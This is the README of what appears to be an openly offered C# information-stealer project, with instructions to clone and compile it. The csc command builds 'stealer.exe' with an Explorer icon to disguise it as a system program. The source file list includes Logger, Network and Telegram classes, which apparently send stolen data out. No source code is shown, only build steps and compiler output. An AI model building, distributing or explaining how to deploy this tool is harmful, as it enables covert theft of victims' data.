#C# stealer
## installing
clone and open
```cmd
C:\>git clone https://github.com/dazmaks/csharp-stealer
C:\>cd csharp-stealer
```
compile<br>
you need [.NET compiler](https://visualstudio.microsoft.com/) and [cmake](https://cmake.org/download/) installed<br>
at the example I am using 4.8 C# compiler
```cmd
C:\csharp-stealer>make
mkdir bin
csc -optimize /target:exe /out:bin/stealer.exe /win32icon:icons/explorer.ico -recurse:src\Stealer.cs src\Config.cs src\classes\Logger.cs src\classes\Network.cs src\classes\Telegram.cs src\asinfo\AssemblyInfo.cs
Microsoft (R) Visual C# Compiler version 4.8.4084.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```
